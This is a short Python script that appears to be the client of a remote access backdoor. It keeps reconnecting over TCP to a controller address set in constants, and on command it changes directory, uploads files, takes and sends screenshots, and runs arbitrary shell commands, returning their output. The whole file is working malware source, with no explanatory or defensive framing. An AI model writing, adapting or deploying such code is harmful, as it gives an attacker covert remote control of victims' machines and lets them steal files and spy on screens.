import os
import time
import random
import socket
import pyautogui
import subprocess

# Flags
SCCS = "<SCCS>"
FILE = "<FILE>"
ERRO = "<ERRO>"

HOST = "127.0.0.1"
PORT = 3333
TIME = 1 * 60

while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((HOST, PORT))

        ''' FUNCTIONS '''

        def screenshot():
            try:
                scrn = pyautogui.screenshot()
                name = f"{random.randint(1, 1000)}.jpeg"
                scrn.save(name)

                upload_file(name)
            except:
                sock.send(ERRO.encode())

        def changes_dir(x):
            try:
                os.chdir(x)
                sock.send(SCCS.encode())
            except:
                sock.send(ERRO.encode())

        def upload_file(x):
            try:
                with open(x, "rb") as file:
                    data = file.read()

                sock.send(FILE.encode())
                sock.send(x.encode())
                sock.send(data)
            except:
                sock.send(ERRO.encode())

        def execute_cmd(x):
            output = subprocess.getoutput(x)
            if not output:
                sock.send(SCCS.encode())
            else:
                sock.send(output.encode())


        while True:
            response = sock.recv(1024).decode()
            commands = response.split()
            
            ''' Execute Functions On Diffrent Command '''

            match commands[0]:
                case "cd":
                    changes_dir(commands[1])
                case "download":
                    upload_file(commands[1])
                case "screenshot":
                    screenshot()
                case _:
                    execute_cmd(response)

    except:
        time.sleep(TIME)
